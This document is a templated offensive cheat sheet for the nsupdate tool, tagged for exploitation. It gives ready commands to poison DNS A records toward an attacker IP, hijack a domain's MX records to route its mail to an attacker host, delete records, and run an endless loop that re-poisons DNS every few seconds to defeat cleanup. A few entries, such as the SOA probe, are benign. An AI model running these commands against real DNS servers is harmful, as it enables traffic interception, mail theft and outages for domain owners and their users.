# nsupdate
> Dynamic DNS update client for poisoning DNS records and hijacking traffic
<!-- tags: nsupdate,dns,dynamic-dns,poisoning,mitm -->

---

## add dns a record
Point a hostname to attacker IP with heredoc input.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add {{HOSTNAME:str:host.example.com}} 300 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=high | phase=exploit | tags=dns,poison,a-record -->

---

## dns interactive session
Manually enter commands in interactive session.

```bash
nsupdate
```

<!-- meta: risk=med | phase=exploit | tags=dns,interactive -->

---

## delete dns a record
Remove existing DNS A record from target zone.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update delete {{HOSTNAME:str:host.example.com}} A
send
quit
EOF
```

<!-- meta: risk=high | phase=exploit | tags=dns,delete -->

---

## replace dns record hijack
Atomically swap old record with new one.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update delete {{HOSTNAME:str:host.example.com}} A
update add {{HOSTNAME:str:host.example.com}} 300 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=high | phase=exploit | tags=dns,replace,hijack -->

---

## poison dns persistent loop
Continuously re-poison DNS to fight cleanup tasks.

```bash
while true; do
  nsupdate <<NSU
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update delete {{HOSTNAME:str:host.example.com}} A
update add {{HOSTNAME:str:host.example.com}} 60 A {{LHOST:ip}}
send
quit
NSU
  sleep 3
done
```

<!-- meta: risk=critical | phase=exploit | tags=dns,persistent,loop,mitm -->

---

## add dns records bulk
Add several DNS records in one batch.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add host1.example.com 300 A {{LHOST:ip}}
update add host2.example.com 300 A {{LHOST:ip}}
update add host3.example.com 600 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=high | phase=exploit | tags=dns,bulk -->

---

## add dns cname record
Create alias record pointing one name to another.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add alias.example.com 300 CNAME target.example.com
send
quit
EOF
```

<!-- meta: risk=med | phase=exploit | tags=dns,cname -->

---

## add dns txt record
Add a TXT record for verification or arbitrary data.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add {{HOSTNAME:str:test.example.com}} 300 TXT "{{TEXT:str:verification-string}}"
send
quit
EOF
```

<!-- meta: risk=med | phase=exploit | tags=dns,txt -->

---

## hijack dns mx email
Redirect target's mail to attacker-controlled host.

```bash
nsupdate <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update delete {{DOMAIN:domain:example.com}} MX
update add {{DOMAIN:domain:example.com}} 300 MX 10 attacker-mail.example.com
update add attacker-mail.example.com 300 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=critical | phase=exploit | tags=dns,mx,email,hijack -->

---

## add dns record tsig key
Use TSIG key file when zone requires authentication.

```bash
nsupdate -k {{KEY_FILE:file:Kexample.com.+157+12345.key}} <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add {{HOSTNAME:str:secure.example.com}} 300 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=high | phase=exploit | tags=dns,tsig,auth -->

---

## debug dns update verbose
Verbose output to inspect DNS update wire protocol.

```bash
nsupdate -v <<EOF
server {{TARGET:ip}}
zone {{DOMAIN:domain:example.com}}
update add {{HOSTNAME:str:test.example.com}} 300 A {{LHOST:ip}}
send
quit
EOF
```

<!-- meta: risk=low | phase=exploit | tags=dns,debug -->

---

## probe dns soa updates
Probe SOA before attempting updates.

```bash
dig @{{TARGET:ip}} {{DOMAIN:domain:example.com}} SOA +short
```

<!-- meta: risk=safe | phase=recon | tags=dns,soa,probe -->
